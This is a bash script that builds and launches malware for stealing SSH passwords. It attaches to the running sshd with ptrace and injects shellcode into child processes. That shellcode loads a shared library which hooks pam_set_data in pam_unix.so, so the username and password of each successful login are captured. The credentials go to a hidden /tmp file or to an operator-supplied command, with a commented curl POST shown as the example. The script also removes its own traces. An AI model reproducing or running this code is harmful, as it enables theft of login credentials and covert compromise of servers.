#! /bin/bash
inject_s="/tmp/.i.c"
shellcode_s="/tmp/.i.s"
got_s="/tmp/.g.c"
evilSoPath="/tmp/hello.so"
inject_o="/tmp/.i"
payload="/tmp/.password.txt"
mode="0"
sshd_pid=$(ps -ef | grep "sshd" -m 1| grep -v grep | awk '{print $2}')
slient_mode="0"
slient_user="anyone"
libc_string="libc-"
while getopts ":e:m:o:p:d:l:" opt
do
    case $opt in
        e)
        evilSoPath=$OPTARG
        ;;
        m)
        mode=$OPTARG
        ;;
        o)
        inject_o=$OPTARG
        ;;
        p)
        payload=$OPTARG
        ;;
        d)
        slient_mode="1"
        slient_user=$OPTARG
        ;;
        l)
        libc_string=$OPTARG
        ;;
    esac
done
cat>"${inject_s}"<<EOF
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <signal.h> 
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <link.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <signal.h>
#include <string.h>
#include <sys/wait.h>

char evilSoPath[] = "THISISEVILSOPATH";
char libcRegEx[] = "THISISLIBCSTRING";
struct gcStack {
    struct gcStack * up;
    pid_t * target_pid;
} * gcs;
int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytesRead = 0;
    int i = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytesRead < len)
    {
    word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
    if (word == -1)
    {
        fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
        return 1;
    }
    bytesRead += sizeof(long);
    if (bytesRead > len)
    {
        memcpy(ptr + i, &word, sizeof(long) - (bytesRead - len));
        break;
    }
    ptr[i++] = word;
    }

    return 0;
}


int ptrace_readdata( pid_t pid,  uint8_t *src, uint8_t *buf, size_t size )
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = buf;

    for ( i = 0; i < j; i ++ )
    {
         d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
         memcpy( laddr, d.chars, 4 );
         src += 4;
         laddr += 4;
    }

    if ( remain > 0 )
    {
        d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
        memcpy( laddr, d.chars, remain );
    }

    return 0;

}

int ptrace_writedata( pid_t pid, uint8_t *dest, uint8_t *data, size_t size )
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;
    
    laddr = data;
    
    for ( i = 0; i < j; i ++ )
    {
        memcpy( d.chars, laddr, 4 );
        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
    
        dest  += 4;
        laddr += 4;
    }

    if ( remain > 0 )
    {
        d.val = ptrace( PTRACE_PEEKTEXT, pid, dest, 0 );
        for ( i = 0; i < remain; i ++ )
        {
            d.chars[i] = *laddr ++;
        }

        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
        
    }

    return 0;
}


int ptrace_writestring( pid_t pid, uint8_t *dest, char *str  )
{
    return ptrace_writedata( pid, dest, str, strlen(str)+1 );
}

int ptrace_call( pid_t pid, uint64_t addr, long *params, uint32_t num_params, struct user_regs_struct* regs ,int is_trap)
{
    
    uint32_t i;

    long *regs_param[7]={
        (long*)&(regs->rdi),
        (long*)&(regs->rsi),
        (long*)&(regs->rdx),
        (long*)&(regs->rcx),
        (long*)&(regs->r8),
        (long*)&(regs->r9)
    };

    // 前6个参数压寄存器
    for ( i = 0; i < num_params && i < 6; i ++ )
    {
        // params_reg[i] = params[i];
        memcpy(regs_param[i],&params[i],sizeof(long));
    }

    
    // 超过6个压栈
    if ( i < num_params )
    {
        regs->rsp -= (num_params - i) * sizeof(long) ;
        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&params[i], (num_params - i) * sizeof(long) );
    }
    regs->rsp -= sizeof(long) ;
    if(is_trap == 0){
        char code[] = {0xcd,0x80,0xcc,0};//调用中断

        //ptrace_writedata( pid, (void *)regs->rip, (uint8_t *)&code, 4 );

        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&code, 4 );
    }else{
        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&regs->rip, sizeof(long) );
    }
    
    regs->rip = addr;
    if ( ptrace_setregs( pid, regs ) == -1 
        || ptrace_continue( pid ) == -1 )
    {
        return -1;
    }


    waitpid( pid, NULL, WUNTRACED );
    
    return 0;
}



int ptrace_getregs( pid_t pid, struct user_regs_struct* regs )
{
    if ( ptrace( PTRACE_GETREGS, pid, NULL, regs ) < 0 )
    {
        printf( "- [Getregs][%d] Can not get register values\n",pid );
        return -1;
    }

    return 0;
}

int ptrace_setregs( pid_t pid, struct user_regs_struct* regs )
{
    if ( ptrace( PTRACE_SETREGS, pid, NULL, regs ) < 0 )
    {
        printf( "- [Setregs][%d] Can not set register values\n",pid );
        return -1;
    }

    return 0;
}




int ptrace_continue( pid_t pid )
{
    if ( ptrace( PTRACE_CONT, pid, NULL, 0 ) < 0 )
        {
            perror( "ptrace_cont" );
            return -1;
        }

        return 0;
}

int ptrace_attach( pid_t pid )
{
    if ( ptrace( PTRACE_ATTACH, pid, NULL, 0  ) < 0 )
    {
        perror( "ptrace_attach" );
        return -1;
    }

    waitpid( pid, NULL, WUNTRACED );

    //DEBUG_PRINT("attached\n");

    if ( ptrace( PTRACE_SYSCALL, pid, NULL, 0  ) < 0 )
    {
        perror( "ptrace_syscall" );
        return -1;
    }



    waitpid( pid, NULL, WUNTRACED );

    return 0;
}

int ptrace_detach( pid_t pid )
{
    if ( ptrace( PTRACE_DETACH, pid, NULL, 0 ) < 0 )
        {
            perror( "ptrace_detach" );
            return -1;
        }

        return 0;
}

void get_libc_path( pid_t pid, char* path )
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if ( pid < 0 )
    {
        /* self process */
        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
    }
    else
    {
        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
    }

    fp = fopen( filename, "r" );

    if ( fp != NULL )
    {
        while ( fgets( line, sizeof(line), fp ) )
        {
            if ( strstr( line, libcRegEx ) )
            {
               
                 char *m = strrchr(line,' ');
                char *tmp=strchr(m,'\n');
                *tmp='\0';
                m = m+1;
                strcpy(path,m);
                break;
            }
        }

                fclose( fp ) ;
    }

    return;
}
void* get_module_base( pid_t pid, const char* module_name )
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if ( pid < 0 )
    {
        /* self process */
        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
    }
    else
    {
        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
    }

    fp = fopen( filename, "r" );

    if ( fp != NULL )
    {
        while ( fgets( line, sizeof(line), fp ) )
        {
            if ( strstr( line, module_name ) )
            {
                pch = strtok( line, "-" );
                addr = strtoul( pch, NULL, 16 );

                if ( addr == 0x8000 )
                    addr = 0;

                break;
            }
        }

                fclose( fp ) ;
    }

    return (void *)addr;
}
void* get_remote_addr( pid_t target_pid, const char* module_name, void* local_addr )
{
    void* local_handle, *remote_handle;

    local_handle = get_module_base( -1, module_name );
    remote_handle = get_module_base( target_pid, module_name );

    //printf( "+ get_remote_addr: local[%x], remote[%x]\n", local_handle, remote_handle );

    return (void *)(local_addr-local_handle+remote_handle  );
}



//=====================utils end=====================

void ManualGC(pid_t target_pid){
    struct user_regs_struct regs,original_regs;
    char libc_path[255];
    void * handle = dlopen(libc_path,RTLD_LAZY);
    get_libc_path(target_pid,libc_path);
    void * self_waitpid_addr = dlsym(handle,"waitpid");
    printf("+ [ManualGC][%d] Self Waitpid address:%p\n",target_pid,self_waitpid_addr);
    void* libc_moudle_base = get_module_base(-1,libcRegEx);
    void* waitpid_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_waitpid_addr );
    printf("+ [ManualGC][%d] Remote Waitpid address:%p\n",target_pid,waitpid_addr);
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [ManualGC][%d] Getregs Error,target: %d\n",target_pid,target_pid );
        return -1;
    }
    memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
    while(1){
        long parameters[3];
        parameters[0] = -1;      
        parameters[1] = NULL; 
        parameters[2] = WNOHANG ; 
        if(ptrace_call( target_pid, (uint64_t)waitpid_addr, parameters, 3,&regs,0 )==-1){
                printf("- [ManualGC][%d] Writedata Error\n",target_pid );
                return -1;
        }
        ptrace_getregs( target_pid, &regs ); // 获得调用结果
        int retval = regs.rax;
        printf("+ [ManualGC][%d] waitpid = %ld \n",target_pid,retval );
        if(retval == -1||retval == 0||retval == 4294967295){ // 4294967295 == -1
            break;
        }
    }
    

    ptrace_setregs( target_pid, &original_regs );
    ptrace_continue( target_pid );


}

int Inject_Shellcode(pid_t target_pid){
        struct user_regs_struct regs, original_regs;
        void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
        uint8_t *remote_code_ptr,*local_code_ptr;
        uint32_t code_length;
        char libc_path[255];
        FILE *fp;
        
        
        fp = fopen(evilSoPath,"r");
        if(fp == NULL){
            printf("! [Inject][%d] Cannot find so file, Exit and remove",target_pid);
            char buf[ 1024 ];
	        int count;
	        count = readlink( "/proc/self/exe", buf, 1024 );
	        if ( count < 0 || count >= 1024 )
	        { 
                exit(0);
	        }
	        buf[ count ] = '\0';
	        char cmd[1024];
            snprintf(cmd,2048,"rm %s",buf);
            system(cmd);
            exit(0);
        }else{
            fclose(fp);
        }
        if ( ptrace_attach( target_pid ) == -1 ){

                printf("- [Inject][%d] inject attach failed\n",target_pid );
                return -1;
        }
        printf ("+ [Inject][%d] Waiting for process...\n",target_pid);
        printf ("+ [Inject][%d] Getting Registers\n",target_pid);
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
        printf ("+ [Inject][%d] Injecting shell code at %p\n", target_pid,(void*)regs.rip);
        

        
        void* libc_moudle_base = NULL;
        libc_moudle_base = get_module_base(-1,libcRegEx);
        get_libc_path(target_pid,libc_path);
        if(libc_moudle_base==NULL){
            printf("- [Inject][%d] Can't find libc-xxxx,try to find libc.so.x\n",target_pid);
            char tmp_libc[] = "libc.so";
            strcpy(libcRegEx,tmp_libc);
            libc_moudle_base = get_module_base(-1,libcRegEx);
            get_libc_path(target_pid,libc_path);
        }

        void * handle = dlopen(libc_path,RTLD_LAZY);
        void * self_dlopen_mode_addr = dlsym(handle,"dlopen");
        if(self_dlopen_mode_addr==NULL){
            printf("- [Inject][%d] Can't find dlopen in libc,try to use __libc_dlopen_mode\n",target_pid);
            self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
        }
        void * self_malloc_addr = dlsym(handle,"malloc");
        void * self_mmap_addr = dlsym(handle,"mmap");
        malloc_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_malloc_addr );
        mmap_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_mmap_addr );
        dlopen_mode_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_dlopen_mode_addr );
        
        printf("+ [Inject][%d] self libc moudle base:%p\n",target_pid,libc_moudle_base);
        printf("+ [Inject][%d] remote libc path:%s\n",target_pid,libc_path);
        printf("+ [Inject][%d] self libc_dlopen_mode base:%p\n",target_pid,self_dlopen_mode_addr);
        printf("+ [Inject][%d] remote malloc addr:%p\n",target_pid,malloc_addr);
        printf("+ [Inject][%d] remote mmap addr:%p local:%p\n",target_pid,mmap_addr,self_mmap_addr);
        printf("+ [Inject][%d] remote libc_dlopen_mode addr:%p\n",target_pid,dlopen_mode_addr);




        long parameters[10];
        parameters[0] = 0;      // addr
        parameters[1] = 0x4000; // size
        parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
        parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
        parameters[4] = 0; //fd
        parameters[5] = 0; //offset

        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
                printf("- [Inject][%d]Writedata Error\n",target_pid );
                return -1;
        }
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- [Inject][%d] Getregs Error\n",target_pid );
                return -1;
        }
        printf("+ [Inject][%d] mmap result: %p\n",target_pid,regs.rax);
        remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址
        ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);
        printf("+ [Inject][%d] Writing EvilSo Path at:%p\n",target_pid,remote_code_ptr);
        parameters[1] = 0x2;      // addr
        parameters[0] = remote_code_ptr; // size
        extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
        memcpy((void*)((long)&_dlopen_mode_param1_s+2),&remote_code_ptr,sizeof(long));
        memcpy((void*)((long)&_dlopen_mode_addr_s+2),&dlopen_mode_addr,sizeof(long));
        remote_code_ptr += strlen(evilSoPath)+1;
        local_code_ptr = (uint8_t *)&_inject_start_s;
        code_length = (long)&_inject_end_s - (long)&_inject_start_s;
        ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
        printf("+ [Inject][%d] Writing Shellcode at:%p code length:%d\n",target_pid,remote_code_ptr,code_length);
        regs.rip = (long)remote_code_ptr+6;
        ptrace_setregs( target_pid, &regs );
        ptrace_continue( target_pid );
        waitpid( target_pid, NULL, WUNTRACED  );
        printf("+ [Inject][%d] EvilSo Injected.Recorver the regsing...\n",target_pid);
        ptrace_setregs( target_pid, &original_regs );
        
        ptrace_continue( target_pid );
        //ptrace_detach(target_pid);
        

}



int WaitforLibPAM(pid_t target_pid){
    struct user_regs_struct regs;

    if ( ptrace_attach( target_pid ) == -1 ){

        printf("- [WaitforLibPAM] WaitforLibPAM attach Failed\n" );
        return -1;
    }
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [WaitforLibPAM] Getregs Error\n" );
        return -1;
    }
    long num,bit=0,finded = 0;
    char *path = malloc(255);
    char libsystemd[] = "login.defs";
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
        if(num ==257){
            ptrace_getregs( target_pid, &regs ) ;
            ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
            if(strstr(path,libsystemd)){
                printf("+ [WaitforLibPAM][%d] SubProcess:openat find path: %s\n",target_pid,path);
                ptrace_detach(target_pid);
                Inject_Shellcode(target_pid);
                break;
            }
        }
        if(num ==2){
            ptrace_getregs( target_pid, &regs ) ;
            ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
            if(strstr(path,libsystemd)){
                printf("+ [WaitforLibPAM][%d][openat] SubProcess:open find path: %s\n",target_pid,path);
                ptrace_detach(target_pid);
                Inject_Shellcode(target_pid);
                break;
            }
        }

    }
    printf("+ [WaitforLibPAM][%d] Wait ChildProcess Ending\n",target_pid);
    waitpid( target_pid,NULL,0 );
    struct gcStack node;
    node.up = gcs;
    node.target_pid = target_pid;
    gcs = &node;

    printf("+ [WaitforLibPAM][%d] GC commit and ChildProcess End Successful\n",target_pid);
}


int main(int argc, char const *argv[])
{
    

    pid_t                   target_pid;
    target_pid = atoi (argv[1]);
    struct user_regs_struct regs;

    
    

    if ( ptrace_attach( target_pid ) == -1 ){

        printf("- [Main][%d] Attach Failed\n",target_pid );
        return -1;
    }
    printf ("+ [Main][%d] Waiting for process...\n",target_pid);
    printf ("+ [Main][%d] Getting Registers\n",target_pid);
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [Main][%d] Getregs Error\n" ,target_pid);
        return -1;
    }
    printf ("+ [Main][%d] RAX is %p\n",target_pid, (void*)regs.rax);
    long num,subprocess;
    // 初始化栈顶
    struct gcStack bottom;
    bottom.up=NULL;
    bottom.target_pid = 0;
    gcs = &bottom;



    printf ("+ [Main][%d] Initialization stack successful\n",target_pid);

    while(1){
        if(gcs->up != NULL){
            // need GC
            printf ("+ [Main][%d] ManualGC Start\n",target_pid);
            ManualGC(target_pid);
            gcs = gcs->up;
            printf ("+ [Main][%d] ManualGC End\n------------------------------------\n",target_pid);
            
        }
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        pthread_t id;
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
        //printf("+ Now Number = %d\n",num);
        if(num == 56){
            ptrace_getregs( target_pid, &regs ); // 获得调用结果
            printf("+ [Main][%d] Process maybe = %ld \n",target_pid, regs.rax);
            subprocess = regs.rax;
            if(subprocess > 0){
                //ManualGC(target_pid);
                pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
            }

        }
        
    }

        return 0;
}


EOF

cat>"${shellcode_s}"<<EOF
.intel_syntax noprefix
.global _dlopen_mode_addr_s
.global _dlopen_mode_param1_s
.global _inject_start_s
.global _inject_end_s
.global _printf_addr_s
.data
_inject_start_s:
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        push   %rbp
        sub    %rsp, 0x8
        add    %rsp, 0x8
        mov    %rsi, 0x2
_dlopen_mode_param1_s:
        mov    %rdi,0x1122334455667788
_dlopen_mode_addr_s:
        movabs %rax,0x1122334455667788
        call %rax
        int 0x80
        int 0xcc
_inject_end_s:
.space 0x400, 0
.end
EOF
cat>"${got_s}"<<EOF
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <assert.h>
#include<dlfcn.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define MAX_BUF_SIZE 1024
#define MAX_PATH 255
__attribute__ ((constructor)) static int so_init(void);
int SEND_MODE = THISISMODE; // 0 = output to file, 1= command mode
char SEND_TARGET[MAX_PATH] = "THISISPAYLOAD";// 如果SEND_MODE = 0 ，则会将密码写入这个目录下，如果
char EVILSOPATH[] = "THISISEVILSOPATH";
//int SEND_MODE = 1; // 0 = output to file, 1= command mode
//char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";
int SLIENT_MODE = THISISSLIENTMODE; // 0 = disable , 1 = enable
char SLIENT_USER[] = "THISISSLIENTUSER"; // 开启slientmode后，如果设置为anyone则抓到任意用户密码就自删除退出，否则则判断用户名是否与
                             // 当前值相同，相同则销毁退出

struct pam_handle {
    char *authtok;
    unsigned caller_is;
    struct pam_conv *pam_conversation;
    char *oldauthtok;
    char *prompt;                /* for use by pam_get_user() */
    char *service_name;
    char *user;
    char *rhost;
    char *ruser;
    char *tty;
    char *xdisplay;
    char *authtok_type;          /* PAM_AUTHTOK_TYPE */
    /*
    struct pam_data *data;
    struct pam_environ *env;
    struct _pam_fail_delay fail_delay;
    struct pam_xauth_data xauth;
    struct service handlers;
    struct _pam_former_state former;
    const char *mod_name;
    int mod_argc;
    char **mod_argv;
    int choice;

#ifdef HAVE_LIBAUDIT
    int audit_state;
#endif
    int authtok_verified;
    char *confdir;
    */
};


void* get_module_base(pid_t pid, const char* module_name)
{
    FILE* fp;
    long addr = 0;
    char* pch;
    char filename[32];
    char line[MAX_BUF_SIZE];

    // 格式化字符串得到 "/proc/pid/maps"
    if(pid < 0){
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    }else{
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    // 打开文件/proc/pid/maps，获取指定pid进程加载的内存模块信息
    fp = fopen(filename, "r");
    if(fp != NULL){
        // 每次一行，读取文件 /proc/pid/maps中内容
        while(fgets(line, sizeof(line), fp)){
            // 查找指定的so模块
            if(strstr(line, module_name)){
                // 分割字符串
                pch = strtok(line, "-");
                // 字符串转长整形
                addr = strtoul(pch, NULL, 16);
                break;
            }
        }
    }
    fclose(fp);
    return (void*)addr;
}

struct rel_info {
    uint64_t rel_plt_addr;
    uint32_t rel_plt_size;
    uint64_t str_tab_addr;
    uint64_t sym_tab_addr;
    uint32_t rel_type;
};

struct dynamice_segment {
    Elf64_Dyn *addr;
    uint32_t size;
};

static int get_dyn_section(void *base_addr, struct dynamice_segment *dyn);
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info);
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry);

static int hook_entry (void *base_addr,
                const char *func_name,
                uint64_t *old_entry,
                uint64_t target_entry)
{
    struct dynamice_segment dyn;
    struct rel_info info;

    get_dyn_section(base_addr, &dyn);
    get_rel_info(dyn.addr, dyn.size, &info);

    Elf64_Rela *rel_table = (Elf64_Rela *)info.rel_plt_addr;
    Elf64_Sym *sym_table = (Elf64_Sym *)info.sym_tab_addr;
    char *str_table = (char *)info.str_tab_addr;

    for(int i = 0;i < info.rel_plt_size / sizeof(Elf64_Rela);i++)
    {
        uint32_t number = ELF64_R_SYM(rel_table[i].r_info);
        uint32_t index = sym_table[number].st_name;
        char* func_name2 = &str_table[index];

        if(strcmp(func_name, func_name2) == 0)
        {

            uint64_t *addr = (uint64_t *)(rel_table[i].r_offset + base_addr);

            update_entry(addr, old_entry, target_entry);
            break;
        }
    }


    return 0;
}

static int get_dyn_section(void *base_addr, struct dynamice_segment *dyn)
{
    if (base_addr == NULL || dyn == NULL) {
        return 0;
    }

    //计算program header table实际地址
    Elf64_Ehdr *header = (Elf64_Ehdr*)(base_addr);
    if (memcmp(header->e_ident, "\177ELF", 4) != 0) {
        return -1;
    }

    Elf64_Phdr* phdr_table = (Elf64_Phdr*)(base_addr + header->e_phoff);
    if (phdr_table == 0) {
        return -1;
    }
    size_t phdr_count = header->e_phnum;


    //遍历program header table，ptype等于PT_DYNAMIC即为dynameic，获取到p_offset
    for (int j = 0; j < phdr_count; j++)
    {
        if (phdr_table[j].p_type == PT_DYNAMIC)
        {
            dyn->addr = (Elf64_Dyn *)(phdr_table[j].p_vaddr + (uint64_t)base_addr);
            dyn->size = phdr_table[j].p_memsz;
            break;
        }
    }
    return 0;
}

static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info)
{
    if (info == NULL) {
        return;
    }

    for(int i = 0;i < dynamic_size / sizeof(Elf64_Dyn);i ++)
    {
        uint64_t val = dynamic_table[i].d_un.d_val;
        if (dynamic_table[i].d_tag == DT_JMPREL)
        {
            info->rel_plt_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_STRTAB)
        {
            info->str_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTRELSZ)
        {
            info->rel_plt_size = dynamic_table[i].d_un.d_val;
        }
        if (dynamic_table[i].d_tag == DT_SYMTAB)
        {
            info->sym_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTREL)
        {
            // DT_RELA = 7
            // DT_REL = 17
            info->rel_type = dynamic_table[i].d_un.d_val;
        }
    }
}

static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry)
{
    // 获取当前内存分页的大小
    uint64_t page_size = getpagesize();
    // 获取内存分页的起始地址（需要内存对齐）
    uint64_t mem_page_start = (uint64_t)addr & (~(page_size - 1));
    mprotect((void *)mem_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (old_entry != NULL) {
        *old_entry = *addr;
    }
    *addr = target_entry;
}


typedef int (*FuncPamSetData)(struct pam_handle *, const char *, void *,void* );


static FuncPamSetData old_pam_set_data = NULL;

int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void *data,void* cleanup)
{

        char unix_setcred_return[] = "unix_setcred_return";
        if(strstr(unix_setcred_return,module_data_name)){
            if(SEND_MODE == 0){
                FILE *fp = NULL;
                fp = fopen(SEND_TARGET, "a+");
                //fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
                int ret = *(int*)data;
                if(ret == 0){
                        fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
                }
                fclose(fp);
            }
            if(SEND_MODE == 1){
                int ret = *(int*)data;
                if(ret == 0){
                    char message[1024];
                    snprintf(message,2048,SEND_TARGET,pamh->user,pamh->authtok);
                    system(message);
                    FILE *fp = NULL;

                }
            }
            int ret = *(int*)data;
            if(SLIENT_MODE == 1 && ret ==0){
                    if (strstr(SLIENT_USER,"anyone"))
                    {
                        char cmd[1024];
                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
                        system(cmd);
                    }
                    if (strstr(SLIENT_USER,pamh->user))
                    {
                        char cmd[1024];
                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
                        system(cmd);
                    }
            }

        }
    return old_pam_set_data(pamh,module_data_name,data,cleanup);
}


int so_init(void)
{

    void* base_addr = get_module_base(getpid(), "pam_unix.so");
    void *handle = dlopen("THISISEVILSOPATH",RTLD_NOW);
    void *export_pam_set_data = dlsym(handle,"my_pam_set_data");
    hook_entry(base_addr, "pam_set_data", (uint64_t *)&old_pam_set_data, (uint64_t)export_pam_set_data);

    return 0;
}
EOF

sed -i "s#THISISEVILSOPATH#${evilSoPath}#g" ${inject_s}
sed -i "s#THISISLIBCSTRING#${libc_string}#g" ${inject_s}
sed -i "s#THISISEVILSOPATH#${evilSoPath}#g" ${got_s}
sed -i "s#THISISPAYLOAD#${payload}#g" ${got_s}
sed -i "s#THISISMODE#${mode}#g" ${got_s}
sed -i "s#THISISSLIENTMODE#${slient_mode}#g" ${got_s}
sed -i "s#THISISSLIENTUSER#${slient_user}#g" ${got_s}

gcc -shared ${got_s} -ldl -fPIC -o ${evilSoPath} -std=c99
gcc ${inject_s} ${shellcode_s} -g -o ${inject_o} -ldl -lpthread
rm ${inject_s} ${shellcode_s} ${got_s}
nohup ${inject_o} ${sshd_pid} &
